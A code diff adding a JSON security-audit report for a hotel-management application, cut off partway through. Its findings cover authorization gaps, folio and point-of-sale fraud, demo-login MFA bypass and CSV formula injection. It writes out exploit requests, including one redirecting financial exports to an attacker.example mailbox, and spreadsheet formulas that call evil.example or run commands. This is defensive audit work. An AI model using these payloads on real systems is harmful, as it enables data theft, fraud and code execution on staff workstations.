+        "file": "app/Modules/POS/Http/PosController.php",
+        "line": 288,
+        "scope": "PosController::can",
+        "description": "pos.view is accepted for all write actions"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "database/seeders/RolesAndPermissionsSeeder.php",
+        "line": 46,
+        "description": "auditor and hotel-owner hold *.view, hence pos.view"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "user has pos.view but not pos.manage"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Staff user holding only pos.view",
+      "payloads": [
+        "see instructions (authz)"
+      ],
+      "instructions": [
+        "private can(): abort_unless(pos.manage || pos.view) used by store, addItem, fire, updateLine, removeLine, split, settle, chargeToRoom, sync, transfer, comp",
+        "chargeToRoom posts charges to the guest folio via FolioService::charge (no folios.manage needed); settle (line 178) records payments"
+      ],
+      "observed_result": "A viewer account (e.g. auditor, trainee) can create checks and charge them to any checked-in reservation, or settle checks for cash without a cashier shift being theirs (settle requires an open shift only for cash/card/mobile kinds)."
+    },
+    "remediation": {
+      "strategy": "Give can() an $ability argument like the other controllers and require pos.manage for all non-GET actions."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Preconditions: Staff user holding only pos.view; pos.manage write boundary (checks, settlement, room charges)"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "A viewer account (e.g. auditor, trainee) can create checks and charge them to any checked-in reservation, or settle checks for cash without a cashier shift being theirs (settle requires an open shift only for cash/card/mobile kinds)."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authz:scheduled-reports:runs-as-creator-after-edit-by-other-user",
+    "title": "Scheduled report edited by another user still runs with the creator's identity and hotel allow-list",
+    "description": "User B (reports.manage, hotel-limited, no payroll/accounting permission) edits a report created by the finance director: sets report to a payroll/accounting export and recipients to B's address, calls /run -> receives data B is not allowed to read",
+    "root_cause": "app/Modules/Documents/Application/ScheduledReportRunner.php:31 - Auth::guard('api')->setUser($creator); ctx->set($s->group_id,$s->hotel_id,$creator->allowedHotelIds(),$creator); then exporter renders the report through InternalApi as that user and mails it to $s->recipients",
+    "intended_behavior": "Comment in Exporter/InternalApi: 'a document or export is only ever as visible as the resource it is built from' (checked for the caller) - but the caller at run time is the creator, not the editor",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Documents/Http/ScheduledReportController.php",
+        "line": 31,
+        "scope": "ScheduledReportController::update",
+        "description": "PUT /api/v1/scheduled-reports/{id}; only guard is can('reports.manage') (line 82-86); route-bound model is hotel-scoped via BelongsToHotel so the editor must share the hotel"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Documents/Http/ScheduledReportController.php",
+        "line": 34,
+        "scope": "ScheduledReportController::update",
+        "description": "fill(validated(partial)) replaces report/params/recipients; created_by is never reset to the editor"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Documents/Http/ScheduledReportController.php",
+        "line": 63,
+        "scope": "ScheduledReportController::validated",
+        "description": "'report' may be any ReportRegistry key (payroll-run, general-ledger, police-register...); 'recipients.*' only needs to be an email (line 67)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Documents/Http/ScheduledReportController.php",
+        "line": 50,
+        "scope": "ScheduledReportController::run",
+        "description": "POST .../run lets the same reports.manage editor execute it immediately; comment says 'runs as the schedule's creator'"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Documents/Application/ScheduledReportRunner.php",
+        "line": 32,
+        "scope": "ScheduledReportRunner::run",
+        "description": "Auth::guard('api')->setUser($creator) then ctx->set(group, hotel, $creator->allowedHotelIds(), $creator) (line 33)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Documents/Application/InternalApi.php",
+        "line": 50,
+        "scope": "InternalApi::raw",
+        "description": "sub-request dispatched through the router; auth:api resolves the passport RequestGuard whose user was just set to the creator, so the underlying report controller's can() checks pass with the creator's permissions"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Documents/Application/ScheduledReportRunner.php",
+        "line": 36,
+        "scope": "ScheduledReportRunner::run",
+        "description": "Mail::raw(...)->to($s->recipients)->attachData(rendered report): report rendered with the creator's rights is sent to editor-chosen addresses"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Documents/Http/ScheduledReportController.php",
+        "line": 85,
+        "description": "abort_unless($u->can('reports.manage') || ...) is the only check; no ownership check against created_by"
+      },
+      {
+        "file": "app/Modules/Documents/Application/ScheduledReportRunner.php",
+        "line": 27,
+        "description": "$user = User::find($s->created_by) - identity is always the original creator"
+      },
+      {
+        "file": "app/Modules/Documents/Application/ReportRegistry.php",
+        "line": 57,
+        "description": "'payroll-run' => path 'payroll/runs/{run}' and line 39 'general-ledger' - endpoints that require payroll.view / accounting.view, which a reports.manage-only user (e.g. hotel-owner role '*.view'+'reports.*' lacks payroll data? no: hotel-owner has *.view) - the gap is for roles with reports.manage but without accounting/payroll view"
+      },
+      {
+        "file": "database/seeders/RolesAndPermissionsSeeder.php",
+        "line": 31,
+        "description": "finance-director has reports.* (manage) and all accounting; a lower user with a custom role holding reports.manage only would exploit this"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "Attacker holds reports.manage but lacks the permission of the target report endpoint (payroll.view, accounting.view, guests/police register)"
+      },
+      {
+        "kind": "data_state",
+        "description": "A scheduled report created by a more privileged user exists in a hotel the attacker can access (hotel scope on the model)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Staff user B with reports.manage (no payroll/accounting permission) in hotel H where finance director A created a scheduled report",
+      "payloads": [
+        "PUT /api/v1/scheduled-reports/{id} {\"report\":\"general-ledger\",\"params\":{},\"recipients\":[\"b@attacker.example\"]}",
+        "POST /api/v1/scheduled-reports/{id}/run"
+      ],
+      "instructions": [
+        "Authenticate as B with X-Hotel-Id: H",
+        "Send the PUT to repoint the report and recipients",
+        "Send POST .../run",
+        "Check the mailbox / log mailer output"
+      ],
+      "observed_result": "last_status = 'sent'; the general-ledger (or payroll-run) export rendered with A's permissions arrives at b@attacker.example although GET /api/v1/accounting/reports/general-ledger as B returns 403"
+    },
+    "remediation": {
+      "strategy": "In update(): set created_by = $request->user()->id when report/params/recipients change (re-own the schedule), and in run(): execute as $request->user() instead of created_by; alternatively forbid editing schedules you did not create."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user with reports.manage at hotel H (e.g. limited hotel scope, lower role); User identity / permission boundary (report runs as original creator, e.g. finance director with all_hotels)"
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "User B (reports.manage, hotel-limited, no payroll/accounting permission) edits a report created by the finance director: sets report to a payroll/accounting export and recipients to B's address, calls /run -> receives data B is not allowed to read"
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h1-tenancy"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "authz:tenancy:hotels-and-staff-directory-without-permission",
+    "title": "GET /api/v1/hotels, /hotels/{id} and /staff return group-wide hotel records and the staff directory with roles to any authenticated user",
+    "description": "Any staff user enumerates every hotel in the group (all columns of the Hotel model, incl. settings/contact data) and the full staff list with role names (useful for targeting admins)",
+    "root_cause": "app/Modules/Tenancy/Http/HotelController.php:13 - index()/show() have no can() check (store/update do: lines 25, 38)",
+    "intended_behavior": "routes/web.php:129 /settings/hotels requires hotels.view; /settings/users requires users.view",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Tenancy/routes.php",
+        "line": 12,
+        "scope": "entrypoint",
+        "description": "Route::apiResource('hotels', HotelController::class)->except('destroy'); line 13 GET staff"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Tenancy/Http/StaffController.php",
+        "line": 13,
+        "scope": "propagation",
+        "description": "index() lists id, name, roles of every active user scoped to the hotel without permission"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Tenancy/Http/HotelController.php",
+        "line": 13,
+        "scope": "sink",
+        "description": "index()/show() have no can() check (store/update do: lines 25, 38)"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Tenancy/Http/HotelController.php",
+        "line": 13,
+        "description": "index()/show() have no can() check (store/update do: lines 25, 38)"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "any staff token/session"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Lowest-privilege staff (room-attendant: housekeeping.view only)",
+      "payloads": [
+        "see instructions (authz)"
+      ],
+      "instructions": [
+        "Route::apiResource('hotels', HotelController::class)->except('destroy'); line 13 GET staff",
+        "index()/show() have no can() check (store/update do: lines 25, 38)"
+      ],
+      "observed_result": "Any staff user enumerates every hotel in the group (all columns of the Hotel model, incl. settings/contact data) and the full staff list with role names (useful for targeting admins)"
+    },
+    "remediation": {
+      "strategy": "HotelController@index/show: abort_unless(can hotels.view || hotels.manage) or restrict columns to id/code/name/city; StaffController: require a permission in the pickers' family (e.g. any *.manage) or limit to id/name"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Lowest-privilege staff (room-attendant: housekeeping.view only); hotels.view / users.view permission boundary"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Any staff user enumerates every hotel in the group (all columns of the Hotel model, incl. settings/contact data) and the full staff list with role names (useful for targeting admins)"
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "business-logic:folio:transfer-bypasses-city-ledger-credit-limit-and-sign",
+    "title": "Folio transfer accepts any destination folio (including city-ledger folios) and negative amounts, bypassing the company credit-limit/approval check",
+    "description": "A guest's balance can be moved to an open city-ledger folio of a company that is not approved or already over its limit (receivable risk), and a negative transfer pulls credit from another guest's/company's folio onto the attacker's chosen folio, which can then be refunded (folios.adjust) or used to close the folio at check-out.",
+    "root_cause": "app/Modules/FrontOffice/Application/FolioService.php:163 - transfer() posts transfer_out/transfer_in to any two open folios regardless of kind; no check against from-folio balance",
+    "intended_behavior": "Direct billing only to approved companies within credit limit; transfers move charges, not arbitrary credit",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/FrontOffice/Http/FolioController.php",
+        "line": 111,
+        "scope": "FolioController::transfer",
+        "description": "POST /api/v1/folios/{folio}/transfer with folios.manage; 'to_folio_id' => integer, 'amount' => ['required','integer'] (line 114, no min, no sign check); to-folio loaded with Folio::findOrFail (tenant-scoped, any kind)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 159,
+        "scope": "FolioService::transfer",
+        "description": "only amount === 0 or same folio rejected; both folios merely need to be open"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 163,
+        "scope": "FolioService::transfer",
+        "description": "posts transfer_out(-amount) on from and transfer_in(+amount) on to - into any open folio including kind 'city_ledger', with no balance, credit-limit or city_ledger-approval check"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 172,
+        "description": "transferToCityLedger() enforces company->city_ledger (line 172) and credit_limit (line 176-178) - the control transfer() bypasses"
+      },
+      {
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 131,
+        "description": "reverse() refuses to void transfer lines ('Transfers are corrected by transferring back'), so an erroneous transfer is not caught by the void control either"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "folios.manage (receptionist role has it)"
+      },
+      {
+        "kind": "data_state",
+        "description": "An open city_ledger folio for the target company exists (created by any earlier direct bill), or any second open folio for the negative-amount variant"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Receptionist with folios.manage",
+      "payloads": [
+        "POST /api/v1/folios/{guestFolio}/transfer {\"to_folio_id\":<city ledger folio of over-limit company>,\"amount\":500000}",
+        "POST /api/v1/folios/{victimFolio}/transfer {\"to_folio_id\":<attacker's guest folio>,\"amount\":-50000}"
+      ],
+      "instructions": [
+        "Find an open city_ledger folio id via GET /api/v1/folios",
+        "Transfer the guest balance into it",
+        "Or transfer a negative amount to pull credit onto another folio, then refund/check-out"
+      ],
+      "observed_result": "200 with two transfer lines; the company's receivable exceeds credit_limit (or a non-approved company is billed); the negative variant leaves the attacker's folio in credit"
+    },
+    "remediation": {
+      "strategy": "In FolioService::transfer(): require $amount > 0 (validate 'amount' => 'integer|min:1' in the controller), and throw when $to->kind === 'city_ledger' unless called from transferToCityLedger (pass an internal flag)."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user holding folios.manage; Company credit billing approval (company.city_ledger) and credit_limit enforced only in transferToCityLedger"
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "A guest's balance can be moved to an open city-ledger folio of a company that is not approved or already over its limit (receivable risk), and a negative transfer pulls credit from another guest's/company's folio onto the attacker's chosen folio, which can then be refunded (folios.adjust) or used to close the folio at check-out."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "business-logic:loyalty:unbounded-manual-point-credit",
+    "title": "loyalty.adjust_points can credit an unlimited number of points in one call; points are cash-equivalent via folio/POS redemption",
+    "description": "Staff credits 1,000,000 points to an accomplice member, who pays a folio or bar check with points; revenue is offset against loyalty liability that never corresponded to earned points.",
+    "root_cause": "app/Modules/Loyalty/Application/LoyaltyService.php:185 - credit() adds the points; redeemOnFolio (line 141) converts them to a PTS folio payment and PosLoyalty::redeemTender (PosLoyalty.php:55) to a POS tender",
+    "intended_behavior": "Manual adjustments should be bounded and/or approved",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Loyalty/Http/LoyaltyController.php",
+        "line": 96,
+        "scope": "LoyaltyController::adjust",
+        "description": "POST /api/v1/loyalty/members/{member}/adjust requires loyalty.adjust_points; points integer not_in:0, reason string max:255 (line 99) - no max"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Loyalty/Application/LoyaltyService.php",
+        "line": 171,
+        "scope": "LoyaltyService::adjust",
+        "description": "positive branch skips the lock/limit logic of the negative branch and calls credit()"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Loyalty/Application/LoyaltyService.php",
+        "line": 185,
+        "scope": "LoyaltyService::adjust -> credit (line 227)",
+        "description": "points added to the membership; redeemOnFolio (line 141) and PosLoyalty::redeemTender convert them to folio/POS tender"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "database/seeders/RolesAndPermissionsSeeder.php",
+        "line": 25,
+        "description": "loyalty.adjust_points is a SPECIAL permission not granted to any default role except '*' holders - it is by design the supervisor override; every adjustment records user_id (LoyaltyService line 182)"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "loyalty.adjust_points plus loyalty.manage or POS access to redeem"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Manager with loyalty.adjust_points colluding with a member",
+      "payloads": [
+        "POST /api/v1/loyalty/members/{id}/adjust {\"points\":1000000,\"reason\":\"goodwill\"}"
+      ],
+      "instructions": [
+        "Credit the points",
+        "Member pays a folio or bar check with points"
+      ],
+      "observed_result": "Points credited and redeemable; loyalty liability created without a sale (attributed to the actor in loyalty_transactions)"
+    },
+    "remediation": {
+      "strategy": "Add a program-level per-adjustment cap (e.g. Program.max_manual_adjustment) above which a second approver is required, and emit a loyalty.points_adjusted event for alerting."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Preconditions: Staff user holding loyalty.adjust_points (+ loyalty.manage or pos access to redeem); Loyalty liability (419800) created without a sale"
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Staff credits 1,000,000 points to an accomplice member, who pays a folio or bar check with points; revenue is offset against loyalty liability that never corresponded to earned points."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "business-logic:pos:sync-bypasses-line-and-payment-validation",
+    "title": "POS offline sync accepts negative/zero quantities and unvalidated payment arrays, letting a server lower a check total or settle with arbitrary methods/amounts",
+    "description": "A server syncs a check with lines [item A x1 = 5000, item A x-0.9 = -4500], total 500, settles for 500 cash and serves 5000 worth of goods (stock consumed by pos.check_settled items). Or settles [CASH 10000, CASH -9500] making the drawer expect 500.",
+    "root_cause": "app/Modules/POS/Application/PosService.php:66 - addItem stores quantity and amount = round(price*qty) with negative qty; Check::recalculate (Domain/Check.php:52) sums amounts so the total drops; settle() only requires sum(payments.amount) == total",
+    "intended_behavior": "quantity >= 0.001; payments.*.amount integer min:1; voids/discounts need pos.void/pos.discount",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/POS/Http/PosController.php",
+        "line": 138,
+        "scope": "PosController::sync",
+        "description": "POST /api/v1/pos/sync, guard can() = pos.view/pos.manage; 'checks.*.items.*.quantity' => ['sometimes','numeric'] (line 149, no min) and 'checks.*.payments' => ['nullable','array'] (line 151, no element rules)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/POS/Http/PosController.php",
+        "line": 166,
+        "scope": "PosController::sync",
+        "description": "each item passed straight to pos->addItem($check, menu_item_id, quantity)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/POS/Application/PosService.php",
+        "line": 68,
+        "scope": "PosService::addItem",
+        "description": "line created with 'quantity' => $qty and 'amount' => (int) round(($base+$extra)*$qty) - negative/zero qty gives a negative/zero amount"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/POS/Domain/Check.php",
+        "line": 54,
+        "scope": "Check::recalculate",
+        "description": "subtotal = sum(amount) of non-voided lines; total = max(0, subtotal - comp - discount) - negative lines lower the total without pos.discount/pos.void"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/POS/Http/PosController.php",
+        "line": 172,
+        "scope": "PosController::sync",
+        "description": "raw payments array handed to pos->settle"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/POS/Application/PosService.php",
+        "line": 201,
+        "scope": "PosService::settle",
+        "description": "only sum(amount) === total is checked (line 185-187); each payment row (including negative amounts) is stored in pos_payments and finish() posts the sale"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/POS/Http/PosController.php",
+        "line": 51,
+        "description": "Online addItem enforces quantity min:0.001"
+      },
+      {
+        "file": "app/Modules/POS/Http/PosController.php",
+        "line": 110,
+        "description": "Online settle enforces payments.*.method required and payments.*.amount integer min:1"
+      },
+      {
+        "file": "app/Modules/POS/Http/PosController.php",
+        "line": 127,
+        "description": "voidCheck requires pos.void - the supervisor control that negative lines bypass"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "Any user passing PosController::can (pos.manage e.g. pos-cashier role)"
+      },
+      {
+        "kind": "data_state",
+        "description": "Open cashier shift for cash/card/mobile tenders (PosService line 194-196)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "POS cashier without pos.void/pos.discount",
+      "payloads": [
+        "POST /api/v1/pos/sync {\"checks\":[{\"client_uuid\":\"<uuid>\",\"outlet_id\":1,\"items\":[{\"menu_item_id\":5,\"quantity\":1},{\"menu_item_id\":5,\"quantity\":-0.9}],\"payments\":[{\"method\":\"CASH\",\"amount\":500}]}]}",
+        "payments [{\"method\":\"CASH\",\"amount\":10000},{\"method\":\"CASH\",\"amount\":-9500}]"
+      ],
+      "instructions": [
+        "Open a cashier shift",
+        "Send the sync payload",
+        "Inspect pos_checks.total and pos_payments"
+      ],
+      "observed_result": "Check synced and settled for 500 while a 5000 item was served; or pos_payments contains a -9500 row"
+    },
+    "remediation": {
+      "strategy": "In sync() apply the same rules as addItem/settle: 'checks.*.items.*.quantity' => ['sometimes','numeric','min:0.001'], 'checks.*.payments.*.method' => ['required','string'], 'checks.*.payments.*.amount' => ['required','integer','min:1']; additionally reject qty <= 0 in PosService::addItem."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user with pos.view/pos.manage (no pos.void or pos.discount); Supervisor-only void/discount controls"
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "A server syncs a check with lines [item A x1 = 5000, item A x-0.9 = -4500], total 500, settles for 500 cash and serves 5000 worth of goods (stock consumed by pos.check_settled items). Or settles [CASH 10000, CASH -9500] making the drawer expect 500."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "config:demo-logins:env-gate-and-mfa-bypass",
+    "title": "DEMO_LOGINS one-click sign-in (including the '*' admin) is gated by APP_ENV !== 'production' only, and demo sessions skip mandatory MFA",
+    "description": "Any non-'production' APP_ENV string with DEMO_LOGINS=true (common on staging that holds copied real data) grants anonymous users an admin session; MFA enrolment is skipped for that session",
+    "claimed_root_cause": "app/Http/Controllers/Auth/DemoLoginController.php:180 - Auth::guard('web')->login($user) for admin or any DemoUsersSeeder::USERS login; session 'demo_login'=true",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "routes/web.php",
+        "line": 18,
+        "scope": "routes/web.php guest group",
+        "description": "POST /demo-login/{login} (guest middleware, throttle:20,1, CSRF)"
+      },
+      {
+        "kind": "propagation",
+        "file": "config/app.php",
+        "line": 22,
+        "scope": "config app.demo_logins",
+        "description": "env('DEMO_LOGINS', false) && env('APP_ENV') !== 'production' - any other APP_ENV string (staging, prod, uat, demo) passes"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Http/Controllers/Auth/DemoLoginController.php",
+        "line": 29,
+        "scope": "DemoLoginController::store",
+        "description": "abort_unless(config('app.demo_logins'),404); login name must be 'admin' or a DemoUsersSeeder::USERS key (line 30)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Http/Middleware/HandleInertiaRequests.php",
+        "line": 125,
+        "scope": "HandleInertiaRequests::mustEnrol",
+        "description": "demo_login session flag (set at DemoLoginController line 39) disables mandatory MFA enrolment while the flag is on"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Http/Controllers/Auth/DemoLoginController.php",
+        "line": 36,
+        "scope": "DemoLoginController::store",
+        "description": "Auth::guard('web')->login($user) - admin@opeshotelsoft.test (group-owner, role '*') without password or MFA"
+      }
+    ],
+    "evidence": [
+      {
+        "file": ".env.production.example",
+        "line": 16,
+        "description": "DEMO_LOGINS=false in the production template - the control exists but is a single env flag"
+      },
+      {
+        "file": "tests/Feature/Platform/DemoLoginTest.php",
+        "line": 10,
+        "description": "Existing tests only toggle config('app.demo_logins'), they do not test the APP_ENV expression"
+      }
+    ],
+    "blockers": [
+      "Decisive fact is outside source"
+    ],
+    "validation_plan": {
+      "local": "Review the deployment environment values (APP_ENV, DEMO_LOGINS, TRUSTED_PROXIES, payment gateway credentials) on every internet-facing instance and confirm the gate holds; no code path change is needed for validation.",
+      "deployment": "Owner confirms the production and staging environment files and the edge proxy configuration."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "dos:accounting:general-ledger-unbounded-date-range",
+    "title": "General-ledger report loads every journal line of an account for an arbitrary date range into memory with no cap",
+    "description": "Repeated requests for account 411100 from 2000-01-01 to 2100-01-01 on a busy hotel (tens of thousands of lines/month) exhaust worker memory/time; 1200/min api limit does not help.",
+    "root_cause": "app/Modules/Accounting/Http/AccountingController.php:136 - ->get() of all journal_lines for the account between from and to, then PHP loop computing running balance",
+    "intended_behavior": "Paginate or cap reporting ranges",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Accounting/Http/AccountingController.php",
+        "line": 130,
+        "scope": "entrypoint",
+        "description": "validate from/to only as dates; no max span"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Accounting/Http/AccountingController.php",
+        "line": 109,
+        "scope": "propagation",
+        "description": "trialBalance/incomeStatement aggregate in SQL (safe); generalLedger does not"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Accounting/Http/AccountingController.php",
+        "line": 136,
+        "scope": "sink",
+        "description": "->get() of all journal_lines for the account between from and to, then PHP loop computing running balance"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Accounting/Http/AccountingController.php",
+        "line": 136,
+        "description": "->get() of all journal_lines for the account between from and to, then PHP loop computing running balance"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "large journal_lines table"
+      },
+      {
+        "kind": "authorization_role",
+        "description": "user with accounting.view"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Staff user holding accounting.view",
+      "payloads": [
+        "see instructions (dos)"
+      ],
+      "instructions": [
+        "validate from/to only as dates; no max span",
+        "->get() of all journal_lines for the account between from and to, then PHP loop computing running balance"
+      ],
+      "observed_result": "Repeated requests for account 411100 from 2000-01-01 to 2100-01-01 on a busy hotel (tens of thousands of lines/month) exhaust worker memory/time; 1200/min api limit does not help."
+    },
+    "remediation": {
+      "strategy": "Cap the range (e.g. 366 days) and paginate or stream lines with a cursor."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user holding accounting.view; Request-time resource limits (memory_limit 256M, request timeout)"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Repeated requests for account 411100 from 2000-01-01 to 2100-01-01 on a busy hotel (tens of thousands of lines/month) exhaust worker memory/time; 1200/min api limit does not help."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "export:csv:formula-injection",
+    "title": "CSV/XLSX exports write guest- and public-supplied text (names, special requests, cover notes, review comments) unescaped: cells starting with = + - @ become formulas in Excel",
+    "description": "A guest named '=HYPERLINK(\"http://evil\",\"click\")' or '=cmd|/C calc!A0' (with DDE prompts) lands in a report export; Excel evaluates it on the staff machine.",
+    "root_cause": "app/Modules/Documents/Application/Exporter.php:79 - csv(): fputcsv($out, $r, ';', '\"', '') with cell() (line 64) passing strings through unchanged; same in app/Modules/Accounting/Support/Sheets.php line 41 and the xlsx writers",
+    "intended_behavior": "Exports are trusted spreadsheets for staff",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/GuestPortal/Http/BookingEngineController.php",
+        "line": 104,
+        "scope": "BookingEngineController::book",
+        "description": "guest.first_name / last_name (max:100) and special_requests (max:1000) accepted as free strings from the public booking API"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Documents/Application/Exporter.php",
+        "line": 64,
+        "scope": "Exporter::cell",
+        "description": "cell() passes strings through unchanged (only bools/arrays are converted)"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Documents/Application/Exporter.php",
+        "line": 79,
+        "scope": "Exporter::csv",
+        "description": "fputcsv($out, $r, ';', '\"', '') with no neutralisation of leading = + - @ \\t \\r; same in app/Modules/Accounting/Support/Sheets.php line 40 and the OpenSpout xlsx writer (line 95)"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Documents/Application/ReportRegistry.php",
+        "line": 55,
+        "description": "'police-register' export includes full_name and other guest-supplied text columns"
+      },
+      {
+        "file": "app/Modules/Documents/Http/ExportController.php",
+        "line": 1,
+        "description": "GET /api/v1/exports/{report} downloads the CSV/XLSX for staff (reports.view)"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "Staff opens the export in Excel/LibreOffice and accepts the DDE/external-content prompt (CSV formulas evaluate by default; command execution needs an extra confirmation)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Anonymous guest booking online",
+      "payloads": [
+        "guest.last_name = \"=HYPERLINK(\\\"http://evil.example/\\\"&A1,\\\"click\\\")\"",
+        "special_requests = \"=cmd|'/C calc'!A0\""
+      ],
+      "instructions": [
+        "Book via the public API with the payload as last name",
+        "As staff download /api/v1/exports/police-register?format=csv",
+        "Open in Excel"
+      ],
+      "observed_result": "The cell is evaluated as a formula on the staff workstation"
+    },
+    "remediation": {
+      "strategy": "In Exporter::cell() and Sheets::csv(): when a string starts with one of = + - @ \\t \\r, prefix it with a single quote (') ; for xlsx force a string cell type."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Anonymous public user (booking form, careers application, review, demo request); Public form input -> staff workstation via downloaded export"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "A guest named '=HYPERLINK(\"http://evil\",\"click\")' or '=cmd|/C calc!A0' (with DDE prompts) lands in a report export; Excel evaluates it on the staff machine."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h3-public-files"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "idor:booking-api:sequential-confirmation-plus-surname-yields-manage-token",
+    "title": "Public booking lookup turns a guessable confirmation number + surname into a manage token (cancel/modify/pay) and leaks loyalty number and points balance",
+    "description": "Attacker iterates sequential confirmation numbers with common Cameroonian surnames (20 req/min/IP, no per-booking lockout) to obtain manage tokens, cancel competitors' bookings (fee charged to guest) and harvest loyalty balances",
